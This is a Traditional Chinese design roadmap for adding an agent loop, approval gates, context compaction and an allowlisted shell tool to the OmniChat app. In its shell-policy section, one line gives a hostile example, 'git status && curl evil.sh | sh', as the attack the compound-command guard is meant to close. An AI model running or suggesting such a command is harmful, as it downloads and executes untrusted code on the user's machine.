# 導入計畫：OmniChat Cowork 轉型總計畫（Agent Runtime + 工作區協作）

> **版本**：v2.0（2026-09-11 重整版）
> **性質**：跨多版本的路線圖 + 實作計畫。本文件記錄**尚未完成的設計與實作契約**；已完成項目只保留一段式摘要與檔案指向，實作過程與驗證細節由 Git 歷史與測試承擔。
> **調查基礎**（2026-09-02 實際 clone / 讀碼）：OmniChat master（v1.18.8+）、kelivo @ `7125a25`（串流層重構 `a43b79f`）、RikkaHub @ `08c2648`、AnyBuff（本機 `C:\Users\w2bn1\Documents\GitHub\AnyBuff`）、deepseek-harness、CLI 工具整合計畫 v4（本機 repo 根目錄，2026-08-05）。

---

## 目錄

0. [背景與目標](#0-背景與目標)
1. [架構決策（ADR）](#1-架構決策adr)
2. [Phase 0：AgentLoop 手術（✅ 已完成，餘舊迴圈移除）](#2-phase-0agentloop-手術)
3. [Phase 1：MVP Cowork（🟢 主體完成，餘 P1-6）](#3-phase-1mvp-cowork)
4. [Phase 2：重度場景（⬜ 未實作）](#4-phase-2重度場景)
5. [Phase 3：拋光（⬜ 未實作）](#5-phase-3拋光)
6. [全域風險與注意](#6-全域風險與注意)
7. [驗證策略](#7-驗證策略)
8. [進度追蹤總表](#8-進度追蹤總表)

---

## 0. 背景與目標

> **現況**：OmniChat 已內建 workspace 檔案工具組、MCP 基礎設施、跨輪工具重放（手冊 §3.11）、串流容錯（§3.10）——開了工作區的對話**事實上已是短 agent run**，只是 agent 迴圈寄生在傳輸層。
>
> **目標**：升級為可勝任 **AI Cowork**（編輯文件、製作網站、多步驟研究）的應用——長任務可執行、可監督、可恢復——同時保持 chat 本業與跨平台穩定性。
>
> **不做**：不做雲端服務、不做通用瀏覽器 agent、不改動語音/即時通話主線。

本計畫解決的三個結構性問題：**C1** 工具迴圈寄生在傳輸層（4 份內嵌 `while(true)`）；**C2** L1 retry 以整條工具鏈為重試單位（重放工具副作用）；**C3** 無迭代上限、無預算。C1/C2/C3 已由 Phase 0 完成（kernel + driver + expose 模式），C3 的設定頁曝光留待 Phase 2 可選。

---

## 1. 架構決策（ADR）

（已同步至手冊 §4 ADR 表的條目不重複敘述；此處保留決策結論與未來實作仍需遵守的契約。）

| #      | 決策 | 要點（實作契約） |
| ------ | --- | --- |
| ADR-A1 | **Loop 分兩層：kernel + driver** | kernel（純機械骨架、零 Flutter import）放 `lib/core/services/agent/`；driver（政策層）放 `lib/features/home/services/` |
| ADR-A2 | **`ChatApiService` 退化為單輪傳輸** | `sendMessageStream` 語意 = 恰一輪；follow-up 以 **OpenAI 中立格式**組裝，複用 §3.11 三家轉換器 |
| ADR-A3 | **Retry 粒度 = 單步，永不重放工具副作用** | 工具結果由 kernel/driver 持有並落地；重試 = 重發同一 follow-up 請求 |
| ADR-A4 | **上限 = 參數化 `maxSteps`（預設 256）+ 軟預算** | 預算耗盡時停下來問使用者（軟閘），非硬切 |
| ADR-A5 | **審批 = 迴圈暫停，不是阻塞** | 五態 `Auto/Pending/Approved/Denied/Answered`；Denied → 結構化 error JSON；Answered → 使用者答案即工具結果。等待期間不掛住 SSE 連線 |
| ADR-A6 | **壓縮 = 確定性機械優先** | 組裝期投影不改寫 Hive 歷史（歷史是可編輯/重生成的資產） |
| ADR-A7 | **Checkpoint = durable-before-dispatch（Hive 版）** | 模型請求前綴未落地不得發下一動作；三邊界（round 前、工具結果落地後、step 完成後） |
| ADR-A8 | **政策分級：沙盒模式 vs 桌面開發者模式** | 位置邊界（沙盒內外）出界 → ask（審批卡顯示解析後絕對路徑）；**黑名單與 512KB/24KB 上限為 hard floor，不隨審批放寬**；strict 模式可把 ask 全降為 deny |
| ADR-A9 | **Shell 授權模型：allow/ask/deny 三層命令政策** | allowlist 內（含複合守衛通過）→ 直跑；**allowlist 外 → ask**；「永遠允許」寫回 allowlist；**複合命令守衛**：命令含 `&&`、`;`、`\|`、`$()`、backtick 時每段首 token 都須在 allowlist 才免審 |

**已結案不採**（防止未來重提，理由摘要）：
- **工作區 zip 快照回滾（原 P1-5）**：實測對磁碟與系統資源消耗過大、與主流 git-based/差異式 checkpoint 形狀不符 → 完全移除，復原交由使用者自己的 git。舊對話 `workspace_snapshot` 事件不重放不渲染。
- **長輸出外部化（原 P1-4，2026-09-12 回撤）**：>32KB 落盤 `{workspace}/.omnichat/tool_outputs/` 會在使用者資料夾殘留暫存/隱藏檔案 → 完全移除，比照 AnyBuff 改純記憶體 head/tail 上限 + 重新查詢指引（`ToolResultCaps`）；原子寫入同步改 ADR-13 形狀（無 backup 副檔）。勿重新在工作區落盤任何工具狀態。詳 `PLAN_WORKSPACE_ZERO_RESIDUE.md`。
- **MCP 工具審批（原 P1-1 第三源）**：實測設計失能（approve 後重新分類回 Pending、override 未被讀取），且 MCP 為使用者主動啟用的高頻低危呼叫 → 移除，MCP 免審批直接執行。
- **L2 Failover / L3 整輪恢復（§3.10）**：使用者拒絕切備援模型；L3 由 ADR-A7 翻案為 agent run 恢復（P2-1）。
- **自動壓縮改 LLM 摘要**：失敗路徑三難（中斷本輪 / 返回全文 / fallback 機械 trim 總複雜度更高）、ADR-A6 零儲存失效、手機延遲與生命週期、BYOK 成本；既有分工「手動壓縮＝LLM、自動壓縮＝機械」維持。LLM 摘要維持 P2-6 L2「L1 不足時的升級層」定位。
- **models.dev runtime 水合 / 對話中請模型自報窗值**：prep-time 網路相依違反 local-first；模型自報不可驗證。學得窗持久化＋種子表已覆蓋。
- **blocking 確認框（CLI v4）**：以 ADR-A5 暫停/resume 語意取代。

---

## 2. Phase 0：AgentLoop 手術（✅ 已完成）

**已落地**（細節見手冊 §3.14 與 Git 歷史）：`lib/core/services/agent/agent_loop.dart` kernel（maxSteps 256 / token 軟預算 / `await for`+`yield`）、`agent_orchestrator.dart` driver（`exposeToolCallsOnly: true` 單輪傳輸綁定、事件→chunk 重組、`supportsKernelPath` = openai（含 Responses）/claude/google，Neuralwatt 維持 legacy）、`chat_actions._executeGeneration` 依 `settings.agentLoopV1 && supportsKernelPath && onToolCall != null` 分流、kill-switch `agent_loop_v1`（預設 true）、三家 follow-up reasoning echo 貫通＋逐位元組 parity 測試。

**尚餘（未完成）**：
- [ ] **移除四條 legacy transport 迴圈**（kill-switch soak 一個版本後）：chat-completions / Responses / Claude / Google 的內嵌 `while(true)`。移除前雙軌期內**不對舊迴圈加任何新功能**。
- [ ] Neuralwatt parity（可選）。
- [ ] maxSteps/tokenBudget 設定頁曝光（Phase 2 可選，目前為 kernel 預設值）。

---

## 3. Phase 1：MVP Cowork（🟢 主體完成，餘 P1-6）

> **目標**：使用者可以在工作區內完成一個受監督的多步驟檔案任務。
> **獨立積木**（不依賴 Phase 0，可先行出貨）：P1-2 的 R0 與 L0、P1-3、P1-4——皆已落地。

### 3.1 已完成項目（摘要）

| 項目 | 摘要 | 細節位置 |
| --- | --- | --- |
| P1-1 審批五態 + diff | `approval.dart` 引擎（五態、allow/ask/deny、pending/denied/timeout 結構化 JSON）、`tool_events_v1` 事件 `approvalState` 欄位、file 出界 ask（`probePathSafety`）、Pending 逾時 5 分鐘 sweeper、`file_edit` 預覽 diff、政策設定 UI（strict mode + 永遠允許清單）、`resolveApproval` resume 管線 | 手冊 §3.14；Git `ddb0a0e9` `48ef6be8` `55451cd1` `cc14c605` |
| P1-2 自動壓縮 | R0 反應層（overflow 分類＋學窗 `learned_context_windows_v1`＋trim-retry 恰一次）、L0 中段修剪（8192/4096/1024）、L1 機械壓縮（`<conversation_summary>`、固定預算 20k/50k、近期豁免 5×6k、knowledge block、10k 逐字 tail）、v2 觸發公式＋極小種子表＋140k floor、`tool_pairing` 切點安全、mid-run 重評估（kernel `onRoundStart`）、kill-switch `auto_compaction_v1` | 手冊 §3.14 §3；Git `8a5638a0` `ba024156` |
| P1-3 TODO + ask_user | `todo_v1` Hive box（三態整表快照、log-only 不進 §3.11 重放）、`<current_todo_list>` 注入 system 尾部、`ask_user` 資料協定（≤4 題/≤4 選項正規化、`ask_user_pending`/`ask_user_answer`）、`TodoPlanCard`/`AskUserCard`、`resumeAfterAskUserAnswer`（tool event 補答＝resume）、DeepSeek thinking 的 reasoning_content 重放重附（v1.8 僅讀取側且寫入側為死碼——toolResults chunk 從不攜帶 assistantExtras、事件從未存入欄位；2026-09-11 補齊寫入側：handleToolCallsChunk 將 toolCalls chunk 的 echo extras 持久化進 placeholder 事件，builder 於事件缺欄時回退 assistant reasoningText 修復既有對話）、編輯重送版本組摺疊修復（v1.9） | 手冊 §3.14 §4；Git `32d2ddde` `e6950620` `f4db5d79` |
| P1-4 長輸出外部化 | >32KB → `.omnichat/tool_outputs/{tool}-{callId}.txt`（確定性命名）、4KB preview＋取回指引、retention 20 檔/7 天、id-aware 契約貫穿全鏈 | 手冊 §3.14 §5；Git `6518c993` |

**實作契約（仍需遵守）**：
- `write_todos` 為 log-only：排除 §3.11 重放與 L0/L1 配對壓縮；快照只以最新狀態注入 system 尾部，絕不進對話歷史。
- `ask_user` 回答後的 tool event **照 §3.11 重放**（answer JSON = 模型可見記錄，ADR-A5「Answered → answer as tool result」）。
- 審批與問答的 resume 統一走「tool event 補 content ＋ 續跑」路徑；pending 索引必須含 conversationId（雙重作用域，防兩對話共用 round 序號 id 時互相污染）。
- 審批政策於 generation 準備時一次快照；AI Team slot 繼承同一快照；file 出界核准後以 `approvedResolvedPath` 跳過重新分類執行恰一次。
- regeneration context 投影必須按**選中版本**摺疊版本組（`projectMessagesForRegenerationContext(versionSelections:)`；無選中回退最新；`targetGroupId` 組保留全部版本交下游 collapse）——鎖死於 `test/regeneration_context_projection_test.dart`。

### 3.2 P1-6 桌面開發者模式 + Allowlist Shell（⬜ 未實作）

> **藍圖**：CLI 工具整合計畫 v4 §三~§六、§八。blocking 確認框不採（ADR-A9）；執行工程契約逐項採納如下。命名維持 `shell_run`。

- **設定**：`developer_mode_v1`（桌面限定、預設 `false`）+ allowlist（預設 `git, node, npm, npx, python, pip, pandoc, ffmpeg`，可增刪）
- **新工具 `shell_run`**：workspace cwd；**三層命令政策（ADR-A9）**——allowlist 內（含複合守衛通過）直跑；allowlist 外 → ask（Pending 卡顯示完整命令，「本次允許 / 永遠允許（寫回 allowlist）/ 拒絕」，拒絕回結構化 error JSON）；dev-mode opt-in 前置閘；strict 模式可把 ask 全降為 deny
- **複合命令守衛**：命令含 `&&`、`;`、`|`、`$()`、backtick 時，每一段首 token 都必須在 allowlist 才免審，否則整條落 ask（關閉 `git status && curl evil.sh | sh` 型攻擊面）
- **Process 執行契約（CLI v4 §五.1/§五.2）**：
  - 一律 `Process.start()`，**禁止 `Process.run().timeout()`**——pipes 未讀 → 大輸出 pipe deadlock；Future timeout 不殺子程序
  - process 啟動後**立即**建立 stdout/stderr collectors 並持續 drain；超過 cap 後仍讀取並丟棄（防 pipe deadlock）、設 `truncated=true`
  - timeout / cancel / app 結束必須**終止整個 process tree**：Windows Job Object（純 Dart FFI，`JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE`＋`AssignProcessToJobObject`＋`TerminateJobObject`），`taskkill /T` 僅作 fallback——`Process.kill()` 對 `cmd.exe` 子樹無效
  - `CliProcessSupervisor` 統一生命週期：`start / awaitResult / cancel / collectOutput / cleanup`
  - foreground 併發：每 generation 1 個（FIFO，沿用 `_withFetchQueue()` 慣例）
- **Windows 編碼與引導模板（CLI v4 §五.5/§六.1）**：cmd 前綴 `chcp 65001 >nul &`＋`cmd.exe /d /s /c`；PowerShell 前綴 `[Console]::OutputEncoding=UTF8`＋`-NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass`；Dart 端 UTF-8 `allowMalformed: true` 解碼。zh-TW 系統 console 預設 cp950——不做此事 agent 會讀到亂碼並可能誤判重試循環
- **環境與 secret 政策（CLI v4 §五.4/§八.4）**：`includeParentEnvironment: false` + allowlist（`SystemRoot`/`ComSpec`/`TEMP`/`PATH` 等必要項）；stdout/stderr 可能含秘密 → tool event cap＋敏感值遮蔽；log 不保存完整 command 與完整輸出
- **輸出預算**：接 P1-4 長輸出外部化（shell 超限輸出是常態）；24KB stdout / 6KB stderr cap 為外部化前 fallback；序列化總長 ≤32,768 字元
- **Readiness 四態（CLI v4 §三.2）**：`disabled / installing / ready / broken`＋availability 閘（function calling ∧ workspace ∧ shell enabled ∧ **allowlist 成員實際存在於 PATH 的 probe**）；UI 顯示狀態與可理解錯誤
- **ShellConfig 快照**：generation 準備時一次捕獲（cwd、dialect、allowlist、審批政策）；generation 進行中 UI 變更不修改已建立 handler
- **§5.1 教義延伸**：外部程序一律串行（與 `npm install` 等長命令互斥）、輸出截斷、never-parallel 守衛
- **政策分級（ADR-A8）**：開發者模式內允許在工作區建 `.sh/.ps1` 等腳本檔（黑名單例外僅桌面+opt-in），執行時把直譯器加入 allowlist 即可用 `shell_run` 執行；Android 維持全黑名單、不提供 `shell_run`
- **合規**：更新 `STORE_REVIEW_PLAN.md`——MSIX/WACK 重跑（shell 能力敘事）、F-Droid metadata（Android 不受影響）

### 3.3 P1-7 測試矩陣（P1-6 驗收時適用）

- shell：三層政策、複合命令守衛、「永遠允許」寫回 allowlist、dev-mode 關閉時工具不注入；**process 契約**：collectors 先於 wait、超 cap 持續 drain、timeout 終止整個 process tree、cancellation 回收、parent environment 不完整繼承、tool exception 不中斷 stream、cwd 限縮 workspace 內、CJK/cp950 編碼、foreground FIFO、secret 遮蔽；AI Team slot 繼承 shell tools（deny/非成員回傳 result 不中斷流程）
- 全域：`flutter analyze --no-pub` 0 errors（不增量）；既有回歸 + 新測試全綠

---

## 4. Phase 2：重度場景（⬜ 未實作）

> **建議版本**：v1.21.x+（可拆多版）

| #    | 項目 | 內容 | 藍圖 |
| ---- | --- | --- | --- |
| P2-1 | **Checkpoint 持久化** | 新 Hive box `agent_runs_v1`：{conversationId, messageId, stepIndex, pendingApprovals, todos, usage, roundMessages ref}；**durable-before-dispatch** 三邊界（round 發送前綴落地後才發請求 / 工具結果落地後才進下一步 / step 完成標記落地）；落地採 debounce 批次（~200ms）；app 啟動偵測未完成 run → 橫幅「繼續任務？」→ `resumeRun` | deepseek `session-checkpoint-policy` + `SessionWriteBehind` 語意，Hive 輕量版 |
| P2-2 | **背景長任務** | 桌面：關窗縮托盤續跑（`desktop_tray_controller` 現成）+ 完成托盤通知；Android：`AndroidBackgroundManager` 前景服務（現成）+ 通知 | 既有基建 + P2-1 |
| P2-3 | **子代理** | 泛化 AI Team 串行調度：`spawn_subagent` 工具——子代理全新 context、角色 prompt、回傳摘要；主對話不收原始工具軌跡。候選用途：檔案批量摘要、平行翻譯、research fan-out | AnyBuff `agents/` + `AiTeamController` |
| P2-4 | **Mini dev server + Live 預覽** | 127.0.0.1 隨機埠靜態伺服 workspace；`html_preview_dialog` 升級為分頁面板；檔案變更自動重整（watch + 注入 reload bridge）；console 捕獲（注入 bridge）→ 工具 `get_console_errors` | 既有 `html_preview_*` + 新 `dev_server_service.dart` |
| P2-5 | **Proot on Android**（stretch） | **CLI 工具整合計畫 v4 §七即為可行性結論與實作藍圖**：jniLibs `.so` 打包（API 29+ assets 壓縮無 exec 權限）、五階段 rootfs pipeline（download/stage/validate/activate/cleanup＋lock＋atomic rename＋hash pinning、不接受 LLM 指定 URL）、rootfs patcher（DNS/hosts/`LANG=C.UTF-8`/tmp/groups）、FUSE noexec 限制、`MANAGE_EXTERNAL_STORAGE` 策略、phantom process/OEM 風險、前景單次 `shell_exec` 契約；**`WorkspaceMountTable` 為單一事實來源**——host↔guest `/workspace` 映射會波及 File Tools（非僅 shell）；F-Droid 條款（PRoot GPL source offer）見 CLI v4 §十五 | CLI v4 §七/§十五 + RikkaHub `workspace/` 模組 |
| P2-6 | **L2/L3 壓縮** | L2：LLM 摘要壓縮（deepseek `compaction-basic`，用 `generateText` 既有方法）供 L1 機械摘要不足時；L3：**工作區檔案地圖**——組裝期注入 workspace 樹 + per-file 一行描述（來自 FileRecord/mtime），模型需詳情再 `file_read` 指定範圍 | deepseek `compaction-basic` + AnyBuff `truncate-file-tree` 概念 |
| P2-7 | **（可選）kelivo 資料模型對齊** | `message.parts` 遷移 + sealed StreamChunk 事件模型 + trace 錄製回放測試——**僅在需要持續吸收上游 decoder 修補時才做**，否則維持 `tool_events_v1` 投影 | kelivo `a43b79f` |

---

## 5. Phase 3：拋光（⬜ 未實作）

| #    | 項目 | 內容 |
| ---- | --- | --- |
| P3-1 | 瀏覽器 QA 工具 | Playwright via MCP STDIO（桌面限定）：截圖、console errors、點擊驗證——掛入既有 MCP 基礎設施 |
| P3-2 | Skill 庫 | SKILL.md 集合管理：來源 URL + `computedHash` 鎖定（RikkaHub `skills-lock.json` 模式），per-assistant 勾選注入 |
| P3-3 | 跨會話任務恢復 | `agent_runs_v1` 未完成 run 清單 UI（全域「進行中任務」頁）→ resume |
| P3-4 | 上限再校準 | 開發者模式寫入上限提升（2MB 級）+ 磁碟預算顯示；`file_read` 分頁體驗優化 |
| P3-5 | Plan Mode | 先規劃（模型產出計畫）→ 人批 → 再執行的模式切換 |
| P3-6 | 執行後全檔 diff viewer | file_edit 執行後以 metadata 帶全檔 diff，升級專屬 viewer（目前僅執行前 preview diff） |

---

## 6. 全域風險與注意

| 風險 | 緩解 |
| --- | --- |
| **壓縮 × prompt cache 互咬**：每輪壓一點 = cache 永遠冷 | marker 凍結切點＋成批壓縮＋注入位置穩定；`cache_expiry` 機會式觸發延後 Phase 2 |
| **兩把 token 尺**：預算用 `chars/3`、閾值用 usage 實測——混用會誤判 | 觸發一律以 usage 實測為準；chars 估算僅作 L1 內部預算；floor 取保守值 |
| **Windows 穩定性**：外部程序是新的記憶體/並發風險源（pipe deadlock、孤兒子程序樹、cp950 亂碼） | shell 串行、collectors-first drain、Job Object tree-kill、環境 allowlist、secret 遮蔽；手冊 §5 補「外部程序治理」節（P1-6 落地時） |
| **商店合規**：shell/腳本能力改變 MSIX/F-Droid 審查敘事 | ADR-A8 政策分級：hard floor（黑名單＋容量上限）不變；出界 ask 屬「分層同意」敘事；手冊 §3.1 與隱私政策措辭隨落地更新 |
| **同步**：新鍵值分類 | `developer_mode_v1`、shell allowlist、審批政策 = 全域偏好（同步）；agent_runs = 裝置本地（排除）；todo 隨對話資料（tool_outputs 已隨 P1-4 回撤不存在） |
| **Dart `async*`**：`yield*` 於 try/catch 的例外穿透限制 | kernel/driver 一律 `await for` + `yield`（手冊 §3.10） |
| **舊路徑雙軌期** | kill-switch + 一個 soak 版本後移除四條 legacy 迴圈；雙軌期內不對舊迴圈加任何新功能 |

---

## 7. 驗證策略（各 Phase 收尾必跑）

```bash
flutter gen-l10n                # 有新增 l10n key 時
flutter analyze --no-pub        # 0 errors（既有 warnings/info 不增量）
flutter test                    # 新增測試 + 既有回歸
```

- 各 Phase 出貨前：Windows（含 ARM64）+ Android 手動 smoke；涉 MSIX 變更跑 `tool/run_wack.ps1`
- 手冊同步：架構變更級修改必須更新 `OmniChat 專案開發與維護手冊.md`（§3.14 / §4 ADR 表 / §5 平台陷阱）

---

## 8. 進度追蹤總表

| #    | 項目 | 狀態 |
| ---- | --- | --- |
| P0-1 | Loop kernel | ✅ 2026-09-04 |
| P0-2 | Loop driver + kill-switch + Phase-1 hooks + `resumeRun` | ✅ 2026-09-10 |
| P0-3 | `ChatApiService` 單輪化（exposeToolCallsOnly + 三家 echo parity） | 🟡 待：舊迴圈移除（kill-switch soak 後）；Neuralwatt parity（可選） |
| P0-4 | reasoning echo 承載 + body 對照測試 | ✅ 2026-09-04 |
| P0-5 | maxSteps + 軟預算 + soft-stop UX | ✅ 2026-09-10（設定頁曝光留 Phase 2 可選） |
| P1-1 | 審批五態 + diff + resume（file 出界源；MCP 源已移除） | 🟡 2026-09-10（v1.6 修復後）；**尚缺**：`shell_run` 政策源（P1-6）、執行後全檔 diff（P3-6） |
| P1-2 | 壓縮 R0 + L0/L1 + 觸發 + 配對安全 + mid-run 重評估 | 🟡 2026-09-10；**待**：cache_expiry（Phase 2） |
| P1-3 | TODO + 注入 + UI + ask_user 決策卡 | 🟢 2026-09-11（含 v1.8/v1.9 實測修復） |
| P1-4 | ~~長輸出外部化（id-aware 契約）~~ | ⛔ 2026-09-12 已回撤（工作區零殘留，比照 AnyBuff 改記憶體上限，見 `PLAN_WORKSPACE_ZERO_RESIDUE.md`） |
| P1-5 | ~~工作區 zip 快照 + 回滾~~ | ⛔ 2026-09-10 已移除（v1.7），不採 |
| P1-6 | 開發者模式 + allowlist shell | ⬜ |
| P1-7 | 測試（Phase 1 驗收） | ⬜（隨 P1-6） |
| P2-1 ~ P2-7 | Phase 2 全部 | ⬜ |
| P3-1 ~ P3-6 | Phase 3 全部 | ⬜ |
